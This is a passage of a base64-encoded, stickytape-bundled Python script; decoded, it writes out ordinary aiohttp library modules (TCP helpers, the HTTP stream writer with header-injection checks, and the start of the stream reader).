ZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULCBzb2NrZXQuU09fS0VFUEFMSVZFLCAxKVxyXG5cclxuXHJcbmVsc2U6XHJcblxyXG4gICAgZGVmIHRjcF9rZWVwYWxpdmUodHJhbnNwb3J0OiBhc3luY2lvLlRyYW5zcG9ydCkgLT4gTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgIHBhc3NcclxuXHJcblxyXG5kZWYgdGNwX25vZGVsYXkodHJhbnNwb3J0OiBhc3luY2lvLlRyYW5zcG9ydCwgdmFsdWU6IGJvb2wpIC0+IE5vbmU6XHJcbiAgICBzb2NrID0gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKCJzb2NrZXQiKVxyXG5cclxuICAgIGlmIHNvY2sgaXMgTm9uZTpcclxuICAgICAgICByZXR1cm5cclxuXHJcbiAgICBpZiBzb2NrLmZhbWlseSBub3QgaW4gKHNvY2tldC5BRl9JTkVULCBzb2NrZXQuQUZfSU5FVDYpOlxyXG4gICAgICAgIHJldHVyblxyXG5cclxuICAgIHZhbHVlID0gYm9vbCh2YWx1ZSlcclxuXHJcbiAgICAjIHNvY2tldCBtYXkgYmUgY2xvc2VkIGFscmVhZHksIG9uIHdpbmRvd3MgT1NFcnJvciBnZXQgcmFpc2VkXHJcbiAgICB3aXRoIHN1cHByZXNzKE9TRXJyb3IpOlxyXG4gICAgICAgIHNvY2suc2V0c29ja29wdChzb2NrZXQuSVBQUk9UT19UQ1AsIHNvY2tldC5UQ1BfTk9ERUxBWSwgdmFsdWUpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2h0dHBfd3JpdGVyLnB5JywgYiciIiJIdHRwIHJlbGF0ZWQgcGFyc2VycyBhbmQgcHJvdG9jb2wuIiIiXHJcblxyXG5pbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgemxpYlxyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBBd2FpdGFibGUsIENhbGxhYmxlLCBOYW1lZFR1cGxlLCBPcHRpb25hbCwgVW5pb24gICMgbm9xYVxyXG5cclxuZnJvbSBtdWx0aWRpY3QgaW1wb3J0IENJTXVsdGlEaWN0XHJcblxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmJhc2VfcHJvdG9jb2wgaW1wb3J0IEJhc2VQcm90b2NvbFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBOT19FWFRFTlNJT05TXHJcblxyXG5fX2FsbF9fID0gKCJTdHJlYW1Xcml0ZXIiLCAiSHR0cFZlcnNpb24iLCAiSHR0cFZlcnNpb24xMCIsICJIdHRwVmVyc2lvbjExIilcclxuXHJcblxyXG5jbGFzcyBIdHRwVmVyc2lvbihOYW1lZFR1cGxlKTpcclxuICAgIG1ham9yOiBpbnRcclxuICAgIG1pbm9yOiBpbnRcclxuXHJcblxyXG5IdHRwVmVyc2lvbjEwID0gSHR0cFZlcnNpb24oMSwgMClcclxuSHR0cFZlcnNpb24xMSA9IEh0dHBWZXJzaW9uKDEsIDEpXHJcblxyXG5cclxuX1RfT25DaHVua1NlbnQgPSBPcHRpb25hbFtDYWxsYWJsZVtbYnl0ZXNdLCBBd2FpdGFibGVbTm9uZV1dXVxyXG5fVF9PbkhlYWRlcnNTZW50ID0gT3B0aW9uYWxbQ2FsbGFibGVbWyJDSU11bHRpRGljdFtzdHJdIl0sIEF3YWl0YWJsZVtOb25lXV1dXHJcblxyXG5cclxuY2xhc3MgU3RyZWFtV3JpdGVyKEFic3RyYWN0U3RyZWFtV3JpdGVyKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHByb3RvY29sOiBCYXNlUHJvdG9jb2wsXHJcbiAgICAgICAgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCxcclxuICAgICAgICBvbl9jaHVua19zZW50OiBfVF9PbkNodW5rU2VudCA9IE5vbmUsXHJcbiAgICAgICAgb25faGVhZGVyc19zZW50OiBfVF9PbkhlYWRlcnNTZW50ID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9wcm90b2NvbCA9IHByb3RvY29sXHJcbiAgICAgICAgc2VsZi5fdHJhbnNwb3J0ID0gcHJvdG9jb2wudHJhbnNwb3J0XHJcblxyXG4gICAgICAgIHNlbGYubG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLmxlbmd0aCA9IE5vbmVcclxuICAgICAgICBzZWxmLmNodW5rZWQgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuYnVmZmVyX3NpemUgPSAwXHJcbiAgICAgICAgc2VsZi5vdXRwdXRfc2l6ZSA9IDBcclxuXHJcbiAgICAgICAgc2VsZi5fZW9mID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9jb21wcmVzcyA9IE5vbmUgICMgdHlwZTogQW55XHJcbiAgICAgICAgc2VsZi5fZHJhaW5fd2FpdGVyID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLl9vbl9jaHVua19zZW50ID0gb25fY2h1bmtfc2VudCAgIyB0eXBlOiBfVF9PbkNodW5rU2VudFxyXG4gICAgICAgIHNlbGYuX29uX2hlYWRlcnNfc2VudCA9IG9uX2hlYWRlcnNfc2VudCAgIyB0eXBlOiBfVF9PbkhlYWRlcnNTZW50XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdHJhbnNwb3J0KHNlbGYpIC0+IE9wdGlvbmFsW2FzeW5jaW8uVHJhbnNwb3J0XTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdHJhbnNwb3J0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHJvdG9jb2woc2VsZikgLT4gQmFzZVByb3RvY29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wcm90b2NvbFxyXG5cclxuICAgIGRlZiBlbmFibGVfY2h1bmtpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNodW5rZWQgPSBUcnVlXHJcblxyXG4gICAgZGVmIGVuYWJsZV9jb21wcmVzc2lvbihcclxuICAgICAgICBzZWxmLCBlbmNvZGluZzogc3RyID0gImRlZmxhdGUiLCBzdHJhdGVneTogaW50ID0gemxpYi5aX0RFRkFVTFRfU1RSQVRFR1lcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICB6bGliX21vZGUgPSAxNiArIHpsaWIuTUFYX1dCSVRTIGlmIGVuY29kaW5nID09ICJnemlwIiBlbHNlIHpsaWIuTUFYX1dCSVRTXHJcbiAgICAgICAgc2VsZi5fY29tcHJlc3MgPSB6bGliLmNvbXByZXNzb2JqKHdiaXRzPXpsaWJfbW9kZSwgc3RyYXRlZ3k9c3RyYXRlZ3kpXHJcblxyXG4gICAgZGVmIF93cml0ZShzZWxmLCBjaHVuazogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgc2l6ZSA9IGxlbihjaHVuaylcclxuICAgICAgICBzZWxmLmJ1ZmZlcl9zaXplICs9IHNpemVcclxuICAgICAgICBzZWxmLm91dHB1dF9zaXplICs9IHNpemVcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fdHJhbnNwb3J0IGlzIE5vbmUgb3Igc2VsZi5fdHJhbnNwb3J0LmlzX2Nsb3NpbmcoKTpcclxuICAgICAgICAgICAgcmFpc2UgQ29ubmVjdGlvblJlc2V0RXJyb3IoIkNhbm5vdCB3cml0ZSB0byBjbG9zaW5nIHRyYW5zcG9ydCIpXHJcbiAgICAgICAgc2VsZi5fdHJhbnNwb3J0LndyaXRlKGNodW5rKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZShcclxuICAgICAgICBzZWxmLCBjaHVuazogYnl0ZXMsICosIGRyYWluOiBib29sID0gVHJ1ZSwgTElNSVQ6IGludCA9IDB4MTAwMDBcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZXMgY2h1bmsgb2YgZGF0YSB0byBhIHN0cmVhbS5cclxuXHJcbiAgICAgICAgd3JpdGVfZW9mKCkgaW5kaWNhdGVzIGVuZCBvZiBzdHJlYW0uXHJcbiAgICAgICAgd3JpdGVyIGNhblwndCBiZSB1c2VkIGFmdGVyIHdyaXRlX2VvZigpIG1ldGhvZCBiZWluZyBjYWxsZWQuXHJcbiAgICAgICAgd3JpdGUoKSByZXR1cm4gZHJhaW4gZnV0dXJlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIHNlbGYuX29uX2NodW5rX3NlbnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX29uX2NodW5rX3NlbnQoY2h1bmspXHJcblxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UoY2h1bmssIG1lbW9yeXZpZXcpOlxyXG4gICAgICAgICAgICBpZiBjaHVuay5uYnl0ZXMgIT0gbGVuKGNodW5rKTpcclxuICAgICAgICAgICAgICAgICMganVzdCByZXNoYXBlIGl0XHJcbiAgICAgICAgICAgICAgICBjaHVuayA9IGNodW5rLmNhc3QoImMiKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9jb21wcmVzcyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgY2h1bmsgPSBzZWxmLl9jb21wcmVzcy5jb21wcmVzcyhjaHVuaylcclxuICAgICAgICAgICAgaWYgbm90IGNodW5rOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGlmIHNlbGYubGVuZ3RoIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBjaHVua19sZW4gPSBsZW4oY2h1bmspXHJcbiAgICAgICAgICAgIGlmIHNlbGYubGVuZ3RoID49IGNodW5rX2xlbjpcclxuICAgICAgICAgICAgICAgIHNlbGYubGVuZ3RoID0gc2VsZi5sZW5ndGggLSBjaHVua19sZW5cclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGNodW5rID0gY2h1bmtbOiBzZWxmLmxlbmd0aF1cclxuICAgICAgICAgICAgICAgIHNlbGYubGVuZ3RoID0gMFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGNodW5rOlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBpZiBjaHVuazpcclxuICAgICAgICAgICAgaWYgc2VsZi5jaHVua2VkOlxyXG4gICAgICAgICAgICAgICAgY2h1bmtfbGVuX3ByZSA9ICgiJXhcXHJcXG4iICUgbGVuKGNodW5rKSkuZW5jb2RlKCJhc2NpaSIpXHJcbiAgICAgICAgICAgICAgICBjaHVuayA9IGNodW5rX2xlbl9wcmUgKyBjaHVuayArIGIiXFxyXFxuIlxyXG5cclxuICAgICAgICAgICAgc2VsZi5fd3JpdGUoY2h1bmspXHJcblxyXG4gICAgICAgICAgICBpZiBzZWxmLmJ1ZmZlcl9zaXplID4gTElNSVQgYW5kIGRyYWluOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5idWZmZXJfc2l6ZSA9IDBcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuZHJhaW4oKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZV9oZWFkZXJzKFxyXG4gICAgICAgIHNlbGYsIHN0YXR1c19saW5lOiBzdHIsIGhlYWRlcnM6ICJDSU11bHRpRGljdFtzdHJdIlxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIldyaXRlIHJlcXVlc3QvcmVzcG9uc2Ugc3RhdHVzIGFuZCBoZWFkZXJzLiIiIlxyXG4gICAgICAgIGlmIHNlbGYuX29uX2hlYWRlcnNfc2VudCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fb25faGVhZGVyc19zZW50KGhlYWRlcnMpXHJcblxyXG4gICAgICAgICMgc3RhdHVzICsgaGVhZGVyc1xyXG4gICAgICAgIGJ1ZiA9IF9zZXJpYWxpemVfaGVhZGVycyhzdGF0dXNfbGluZSwgaGVhZGVycylcclxuICAgICAgICBzZWxmLl93cml0ZShidWYpXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlX2VvZihzZWxmLCBjaHVuazogYnl0ZXMgPSBiIiIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fZW9mOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgaWYgY2h1bmsgYW5kIHNlbGYuX29uX2NodW5rX3NlbnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX29uX2NodW5rX3NlbnQoY2h1bmspXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2NvbXByZXNzOlxyXG4gICAgICAgICAgICBpZiBjaHVuazpcclxuICAgICAgICAgICAgICAgIGNodW5rID0gc2VsZi5fY29tcHJlc3MuY29tcHJlc3MoY2h1bmspXHJcblxyXG4gICAgICAgICAgICBjaHVuayA9IGNodW5rICsgc2VsZi5fY29tcHJlc3MuZmx1c2goKVxyXG4gICAgICAgICAgICBpZiBjaHVuayBhbmQgc2VsZi5jaHVua2VkOlxyXG4gICAgICAgICAgICAgICAgY2h1bmtfbGVuID0gKCIleFxcclxcbiIgJSBsZW4oY2h1bmspKS5lbmNvZGUoImFzY2lpIilcclxuICAgICAgICAgICAgICAgIGNodW5rID0gY2h1bmtfbGVuICsgY2h1bmsgKyBiIlxcclxcbjBcXHJcXG5cXHJcXG4iXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgc2VsZi5jaHVua2VkOlxyXG4gICAgICAgICAgICAgICAgaWYgY2h1bms6XHJcbiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbGVuID0gKCIleFxcclxcbiIgJSBsZW4oY2h1bmspKS5lbmNvZGUoImFzY2lpIilcclxuICAgICAgICAgICAgICAgICAgICBjaHVuayA9IGNodW5rX2xlbiArIGNodW5rICsgYiJcXHJcXG4wXFxyXFxuXFxyXFxuIlxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBjaHVuayA9IGIiMFxcclxcblxcclxcbiJcclxuXHJcbiAgICAgICAgaWYgY2h1bms6XHJcbiAgICAgICAgICAgIHNlbGYuX3dyaXRlKGNodW5rKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmRyYWluKClcclxuXHJcbiAgICAgICAgc2VsZi5fZW9mID0gVHJ1ZVxyXG4gICAgICAgIHNlbGYuX3RyYW5zcG9ydCA9IE5vbmVcclxuXHJcbiAgICBhc3luYyBkZWYgZHJhaW4oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJGbHVzaCB0aGUgd3JpdGUgYnVmZmVyLlxyXG5cclxuICAgICAgICBUaGUgaW50ZW5kZWQgdXNlIGlzIHRvIHdyaXRlXHJcblxyXG4gICAgICAgICAgYXdhaXQgdy53cml0ZShkYXRhKVxyXG4gICAgICAgICAgYXdhaXQgdy5kcmFpbigpXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fcHJvdG9jb2wudHJhbnNwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9wcm90b2NvbC5fZHJhaW5faGVscGVyKClcclxuXHJcblxyXG5kZWYgX3NhZmVfaGVhZGVyKHN0cmluZzogc3RyKSAtPiBzdHI6XHJcbiAgICBpZiAiXFxyIiBpbiBzdHJpbmcgb3IgIlxcbiIgaW4gc3RyaW5nOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJOZXdsaW5lIG9yIGNhcnJpYWdlIHJldHVybiBkZXRlY3RlZCBpbiBoZWFkZXJzLiAiXHJcbiAgICAgICAgICAgICJQb3RlbnRpYWwgaGVhZGVyIGluamVjdGlvbiBhdHRhY2suIlxyXG4gICAgICAgIClcclxuICAgIHJldHVybiBzdHJpbmdcclxuXHJcblxyXG5kZWYgX3B5X3NlcmlhbGl6ZV9oZWFkZXJzKHN0YXR1c19saW5lOiBzdHIsIGhlYWRlcnM6ICJDSU11bHRpRGljdFtzdHJdIikgLT4gYnl0ZXM6XHJcbiAgICBoZWFkZXJzX2dlbiA9IChfc2FmZV9oZWFkZXIoaykgKyAiOiAiICsgX3NhZmVfaGVhZGVyKHYpIGZvciBrLCB2IGluIGhlYWRlcnMuaXRlbXMoKSlcclxuICAgIGxpbmUgPSBzdGF0dXNfbGluZSArICJcXHJcXG4iICsgIlxcclxcbiIuam9pbihoZWFkZXJzX2dlbikgKyAiXFxyXFxuXFxyXFxuIlxyXG4gICAgcmV0dXJuIGxpbmUuZW5jb2RlKCJ1dGYtOCIpXHJcblxyXG5cclxuX3NlcmlhbGl6ZV9oZWFkZXJzID0gX3B5X3NlcmlhbGl6ZV9oZWFkZXJzXHJcblxyXG50cnk6XHJcbiAgICBpbXBvcnQgYWlvaHR0cC5faHR0cF93cml0ZXIgYXMgX2h0dHBfd3JpdGVyICAjIHR5cGU6IGlnbm9yZVtpbXBvcnRdXHJcblxyXG4gICAgX2Nfc2VyaWFsaXplX2hlYWRlcnMgPSBfaHR0cF93cml0ZXIuX3NlcmlhbGl6ZV9oZWFkZXJzXHJcbiAgICBpZiBub3QgTk9fRVhURU5TSU9OUzpcclxuICAgICAgICBfc2VyaWFsaXplX2hlYWRlcnMgPSBfY19zZXJpYWxpemVfaGVhZGVyc1xyXG5leGNlcHQgSW1wb3J0RXJyb3I6XHJcbiAgICBwYXNzXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3N0cmVhbXMucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBjb2xsZWN0aW9uc1xyXG5pbXBvcnQgd2FybmluZ3NcclxuZnJvbSB0eXBpbmcgaW1wb3J0IEF3YWl0YWJsZSwgQ2FsbGFibGUsIERlcXVlLCBHZW5lcmljLCBMaXN0LCBPcHRpb25hbCwgVHVwbGUsIFR5cGVWYXJcclxuXHJcbmZyb20gLmJhc2VfcHJvdG9jb2wgaW1wb3J0IEJhc2VQcm90b2NvbFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBCYXNlVGltZXJDb250ZXh0LCBzZXRfZXhjZXB0aW9uLCBzZXRfcmVzdWx0XHJcbmZyb20gLmxvZyBpbXBvcnQgaW50ZXJuYWxfbG9nZ2VyXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBGaW5hbFxyXG5cclxuX19hbGxfXyA9IChcclxuICAgICJFTVBUWV9QQVlMT0FEIixcclxuICAgICJFb2ZTdHJlYW0iLFxyXG4gICAgIlN0cmVhbVJlYWRlciIsXHJcbiAgICAiRGF0YVF1ZXVlIixcclxuICAgICJGbG93Q29udHJvbERhdGFRdWV1ZSIsXHJcbilcclxuXHJcbl9UID0gVHlwZVZhcigiX1QiKVxyXG5cclxuXHJcbmNsYXNzIEVvZlN0cmVhbShFeGNlcHRpb24pOlxyXG4gICAgIiIiZW9mIHN0cmVhbSBpbmRpY2F0aW9uLiIiIlxyXG5cclxuXHJcbmNsYXNzIEFzeW5jU3RyZWFtSXRlcmF0b3IoR2VuZXJpY1tfVF0pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHJlYWRfZnVuYzogQ2FsbGFibGVbW10sIEF3YWl0YWJsZVtfVF1dKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYucmVhZF9mdW5jID0gcmVhZF9mdW5jXHJcblxyXG4gICAgZGVmIF9fYWl0ZXJfXyhzZWxmKSAtPiAiQXN5bmNTdHJlYW1JdGVyYXRvcltfVF0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYW5leHRfXyhzZWxmKSAtPiBfVDpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHJ2ID0gYXdhaXQgc2VsZi5yZWFkX2Z1bmMoKVxyXG4gICAgICAgIGV4Y2VwdCBFb2ZTdHJlYW06XHJcbiAgICAgICAgICAgIHJhaXNlIFN0b3BBc3luY0l0ZXJhdGlvblxyXG4gICAgICAgIGlmIHJ2ID09IGIiIjpcclxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXHJcbiAgICAgICAgcmV0dXJuIHJ2XHJcblxyXG5cclxuY2xhc3MgQ2h1bmtUdXBsZUFzeW5jU3RyZWFtSXRlcmF0b3I6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgc3RyZWFtOiAiU3RyZWFtUmVhZGVyIikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9zdHJlYW0gPSBzdHJlYW1cclxuXHJcbiAgICBkZWYgX19haXRlcl9fKHNlbGYpIC0+ICJDaHVua1R1cGxlQXN5bmNTdHJlYW1JdGVyYXRvciI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKHNlbGYpIC0+IFR1cGxlW2J5dGVzLCBib29sXTpcclxuICAgICAgICBydiA9IGF3YWl0IHNlbGYuX3N0cmVhbS5yZWFkY2h1bmsoKVxyXG4gICAgICAgIGlmIHJ2ID09IChiIiIsIEZhbHNlKTpcclxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXHJcbiAgICAgICAgcmV0dXJuIHJ2XHJcblxyXG5cclxuY2xhc3MgQXN5bmNTdHJlYW1SZWFkZXJNaXhpbjpcclxuICAgIGRlZiBfX2FpdGVyX18oc2VsZikgLT4gQXN5bmNTdHJlYW1JdGVyYXRvcltieXRlc106XHJcbiAgICAgICAgcmV0dXJuIEFzeW5jU3RyZWFtSXRlcmF0b3Ioc2VsZi5yZWFkbGluZSkgICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZF1cclxuXHJcbiAgICBkZWYgaXRlcl9jaHVua2VkKHNlbGYsIG46IGludCkgLT4gQXN5bmNTdHJlYW1JdGVyYXRvcltieXRlc106XHJcbiAgICAgICAgIiIiUmV0dXJucyBhbiBhc3luY2hyb25vdXMgaXRlcmF0b3IgdGhhdCB5aWVsZHMgY2h1bmtzIG9mIHNpemUgbi5cclxuXHJcbiAgICAgICAgUHl0aG9uLTMuNSBhdmFpbGFibGUgZm9yIFB5dGhvbiAzLjUrIG9ubHlcclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gQXN5bmNTdHJlYW1JdGVyYXRvcihcclxuICAgICAgICAgICAgbGFtYmRhOiBzZWxmLnJlYWQobikgICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZCxuby1hbnktcmV0dXJuXVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgaXRlcl9hbnkoc2VsZikgLT4gQXN5bmNTdHJlYW1JdGVyYXRvcltieXRlc106XHJcbiAgICAgICAgIiIiWWllbGQgYWxsIGF2YWlsYWJsZSBkYXRhIGFzIHNvb24gYXMgaXQgaXMgcmVjZWl2ZWQuXHJcblxyXG4gICAgICAgIFB5dGhvbi0zLjUgYXZhaWxhYmxlIGZvciBQeXRob24gMy41KyBvbmx5XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIEFzeW5jU3RyZWFtSXRlcmF0b3Ioc2VsZi5yZWFkYW55KSAgIyB0eXBlOiBpZ25vcmVbYXR0ci1kZWZpbmVkXVxyXG5cclxuICAgIGRlZiBpdGVyX2NodW5rcyhzZWxmKSAtPiBDaHVua1R1cGxlQXN5bmNTdHJlYW1JdGVyYXRvcjpcclxuICAgICAgICAiIiJZaWVsZCBjaHVua3Mgb2YgZGF0YSBhcyB0aGV5IGFyZSByZWNlaXZlZCBieSB0aGUgc2VydmVyLlxyXG5cclxuICAgICAgICBUaGUgeWllbGRlZCBvYmplY3RzIGFyZSB0dXBsZXNcclxuICAgICAgICBvZiAoYnl0ZXMsIGJvb2wpIGFzIHJldHVybmVkIGJ5IHRoZSBTdHJlYW1SZWFkZXIucmVhZGNodW5rIG1ldGhvZC5cclxuXHJcbiAgICAgICAgUHl0aG9uLTMuNSBhdmFpbGFibGUgZm9yIFB5dGhvbiAzLjUrIG9ubHlcclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gQ2h1bmtUdXBsZUFzeW5jU3RyZWFtSXRlcmF0b3Ioc2VsZikgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG5cclxuXHJcbmNsYXNzIFN0cmVhbVJlYWRlcihBc3luY1N0cmVhbVJlYWRlck1peGluKTpcclxuICAgICIiIkFuIGVuaGFuY2VtZW50IG9mIGFzeW5jaW8uU3RyZWFtUmVhZGVyLlxyXG5cclxuICAgIFN1cHBvcnRzIGFzeW5jaHJvbm91cyBpdGVyYXRpb24gYnkgbGluZSwgY2h1bmsgb3IgYXMgYXZhaWxhYmxlOjpcclxuXHJcbiAgICAgICAgYXN5bmMgZm9yIGxpbmUgaW4gcmVhZGVyOlxyXG4gICAgICAgICAgICAuLi5cclxuICAgICAgICBhc3luYyBmb3IgY2h1bmsgaW4gcmVhZGVyLml0ZXJfY2h1bmtlZCgxMDI0KTpcclxuICAgICAgICAgICAgLi4uXHJcbiAgICAgICAgYXN5bmMgZm9yIHNsaWNlIGluIHJlYWRlci5pdGVyX2FueSgpOlxyXG4gICAgICAgICAgICAuLi5cclxuXHJcbiAgICAiIiJcclxuXHJcbiAgICB0b3RhbF9ieXRlcyA9IDBcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBwcm90b2NvbDogQmFzZVByb3RvY29sLFxyXG4gICAgICAgIGxpbWl0OiBpbnQsXHJcbiAgICAgICAgKixcclxuICAgICAgICB0aW1lcjogT3B0aW9uYWxbQmFzZVRpbWVyQ29udGV4dF0gPSBOb25lLFxyXG4gICAgICAgIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9wcm90b2NvbCA9IHByb3RvY29sXHJcbiAgICAgICAgc2VsZi5fbG93X3dhdGVyID0gbGltaXRcclxuICAgICAgICBzZWxmLl9oaWdoX3dhdGVyID0gbGltaXQgKiAyXHJcbiAgICAgICAgaWYgbG9vcCBpcyBOb25lOlxyXG4gICAgICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLl9zaXplID0gMFxyXG4gICAgICAgIHNlbGYuX2N1cnNvciA9IDBcclxuICAgICAgICBzZWxmLl9odHRwX2NodW5rX3NwbGl0cyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbTGlzdFtpbnRdXVxyXG4gICAgICAgIHNlbGYuX2J1ZmZlciA9IGNvbGxlY3Rpb25zLmRlcXVlKCkgICMgdHlwZTogRGVxdWVbYnl0ZXNdXHJcbiAgICAgICAgc2VsZi5fYnVmZmVyX29mZnNldCA9IDBcclxuICAgICAgICBzZWxmLl9lb2YgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX3dhaXRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYXN5bmNpby5GdXR1cmVbTm9uZV1dXHJcbiAgICAgICAgc2VsZi5fZW9mX3dhaXRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYXN5bmNpby5GdXR1cmVbTm9uZV1dXHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXVxyXG4gICAgICAgIHNlbGYuX3RpbWVyID0gdGltZXJcclxuICAgICAgICBzZWxmLl9lb2ZfY2FsbGJhY2tzID0gW10gICMgdHlwZTogTGlzdFtDYWxsYWJsZVtbXSwgTm9uZV1dXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBpbmZvID0gW3NlbGYuX19jbGFzc19fLl9fbmFtZV9fXVxyXG4gICAgICAgIGlmIHNlbGYuX3NpemU6XHJcbiAgICAgICAgICAgIGluZm8uYXBwZW5kKCIlZCBieXRlcyIgJSBzZWxmLl9zaXplKVxyXG4gICAgICAgIGlmIHNlbGYuX2VvZjpcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoImVvZiIpXHJcbiAgICAgICAgaWYgc2VsZi5fbG93X3dhdGVyICE9IDIgKiogMTY6ICAjIGRlZmF1bHQgbGltaXRcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoImxvdz0lZCBoaWdoPSVkIiAlIChzZWxmLl9sb3dfd2F0ZXIsIHNlbGYuX2hpZ2hfd2F0ZXIpKVxyXG4gICAgICAgIGlmIHNlbGYuX3dhaXRlcjpcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoInc9JXIiICUgc2VsZi5fd2FpdGVyKVxyXG4gICAgICAgIGlmIHNlbGYuX2V4Y2VwdGlvbjpcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoImU9JXIiICUgc2VsZi5fZXhjZXB0aW9uKVxyXG4gICAgICAgIHJldHVybiAiPCVzPiIgJSAiICIuam9pbihpbmZvKVxyXG5cclxuICAgIGRlZiBnZXRfcmVhZF9idWZmZXJfbGltaXRzKHNlbGYpIC0+IFR1cGxlW2ludCwgaW50XTpcclxuICAgICAgICByZXR1cm4gKHNlbG